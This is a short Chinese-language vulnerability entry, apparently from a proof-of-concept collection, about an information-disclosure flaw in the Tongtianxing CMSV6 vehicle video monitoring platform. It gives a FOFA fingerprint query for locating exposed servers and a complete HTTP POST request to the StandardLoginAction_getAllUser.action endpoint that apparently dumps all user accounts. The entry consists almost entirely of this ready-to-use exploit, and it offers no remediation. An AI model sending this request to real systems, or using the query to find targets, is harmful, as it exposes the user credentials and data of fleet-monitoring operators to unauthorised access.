## 通天星CMSV6车载视频监控平台getAlser.acion接口处存在信息泄露漏洞

通天星CMSV6车载视频监控平台 StandardLoginAction getAlser.acion接口处存在信息泄露漏洞

## fofa

```
body="/808gps/"
```

## poc

```
POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection: close
Content-Length: 9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate

json=null
```

![1708927720796.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242252677.png)